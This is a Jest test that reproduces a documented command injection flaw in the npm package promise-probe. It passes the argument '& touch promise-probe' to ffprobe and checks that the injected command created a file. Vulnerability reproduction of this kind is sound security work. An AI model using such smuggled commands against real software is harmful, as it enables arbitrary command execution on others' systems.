//https://snyk.io/vuln/SNYK-JS-PROMISEPROBE-546816
test("Command Injection in promise-probe", () => {
  const root = require("promise-probe");
  const fs = require("fs");
  const path = "./promise-probe";
  const sleep = require("sleep");

  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  let attack_code = "& touch promise-probe";
  root.ffprobe(attack_code, function () {
    sleep.sleep(5);
    //checking that its created by after exploit.
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);

    fs.unlink(path, function (err) {}); //deleting the file after creation
  });
});
